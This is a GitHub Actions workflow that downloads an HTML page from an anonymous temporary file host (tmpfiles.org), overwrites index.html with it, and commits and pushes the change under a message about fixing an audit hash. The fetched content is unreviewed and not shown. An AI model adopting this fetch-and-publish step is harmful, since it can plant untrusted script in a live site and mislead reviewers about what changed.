name: Update prebuy page
on:
  workflow_dispatch:
permissions:
  contents: write
jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Fix audit hash
        run: |
          curl -fsSL -o index.json "https://tmpfiles.org/dl/1793881271.c36e0f990d6d239a/wyAOJK5cK52j/index.json"
          python3 - << 'PY'
          import json
          from pathlib import Path
          page = json.loads(Path('index.json').read_text())['html']
          if 'applyHash' not in page: raise SystemExit('missing')
          Path('index.html').write_text(page)
          print('wrote', len(page))
          PY
      - name: Commit
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add index.html
          git diff --cached --quiet || git commit -m "Fix #audit hash to open the review page"
          git push
